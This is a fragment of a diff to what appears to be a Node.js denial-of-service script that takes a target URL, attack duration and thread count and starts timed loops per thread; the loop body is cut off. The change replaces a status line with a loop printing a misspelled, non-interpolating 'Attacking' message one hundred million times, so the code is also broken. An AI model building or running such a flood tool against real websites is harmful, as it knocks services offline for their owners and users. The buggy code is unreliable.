@@ -30,7 +30,11 @@ const url = process.argv[2]
 const time = Number(process.argv[3])
 const threads = Number(process.argv[4]) || 1;
 
-console.log(`[Info] Starting ${time} seconds attack on ${url} with ${threads} threads`);
+let counter = 0;
+while (counter < 100000000) {
+  console.log("Podi Attacking To ${url} Dengan ${theards} Theards" + (counter + 1));
+  counter++;
+}
 
 for (let i = 0; i < threads; i++) {
     const int = setInterval(() => {
